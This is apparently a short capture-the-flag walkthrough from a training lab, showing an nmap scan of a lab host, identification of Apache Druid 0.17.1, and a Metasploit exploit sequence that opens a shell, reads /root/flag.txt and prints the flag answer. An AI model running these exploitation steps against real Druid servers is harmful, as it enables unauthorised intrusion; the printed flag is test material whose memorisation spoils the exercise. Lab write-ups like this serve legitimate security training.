# Payloads

### Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.

```bash
nmap -sC -sV 10.129.203.52 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
8081/tcp open  http    Jetty 9.4.12.v20180830
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8081/unified-console.html
|_http-server-header: Jetty(9.4.12.v20180830)
8083/tcp open  http    Jetty 9.4.12.v20180830
|_http-server-header: Jetty(9.4.12.v20180830)
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

mostly website port, lets check it

its running Apache Druid version 0.17.1

```bash
#metasploit
msfconsole
search apache druid
use 0
set rhosts 
set lhost
run
shell
/bin/bash -i
find / -name flag.txt 2>/dev/null
/root/flag.txt
cat /root/flag.txt
HTB{MSF_Expl01t4t10n}
```
